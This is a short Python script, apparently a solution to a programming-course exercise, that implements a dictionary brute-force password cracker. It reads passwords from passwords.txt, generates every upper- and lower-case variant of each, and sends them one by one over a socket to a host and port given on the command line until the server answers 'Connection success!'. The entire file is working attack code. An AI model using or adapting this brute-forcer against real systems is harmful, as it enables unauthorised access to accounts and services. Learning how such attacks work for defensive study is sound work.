# write your code here
import socket
import sys
import string
from itertools import product


class HackerMan:

    def __init__(self):
        self.ipaddress = str()
        self.port = int()
        self.args = sys.argv
        self.message = ""
        self.rcvdmsg = str()
        self.file = open('passwords.txt', 'r')

    def inputs(self):
        self.ipaddress = self.args[1]
        self.port = int(self.args[2])

    def operation(self):
        with socket.socket() as self.cl_socket:
            self.cl_socket.connect((self.ipaddress, self.port))
            self.passgen()

    def passgen(self):
        for line in self.file:
            upper_lower = map(lambda x: ''.join(x).rstrip(),
                              product(*([letter.lower(), letter.upper()] for letter in line)))
            for pswd in upper_lower:
                encpswd = ''.join(pswd).encode('utf-8')
                self.cl_socket.send(encpswd)
                self.rcvdmsg = self.cl_socket.recv(1024).decode('utf-8')
                if self.rcvdmsg == "Connection success!":
                    print("".join(pswd))
                    exit()


hm = HackerMan()
hm.inputs()
hm.operation()
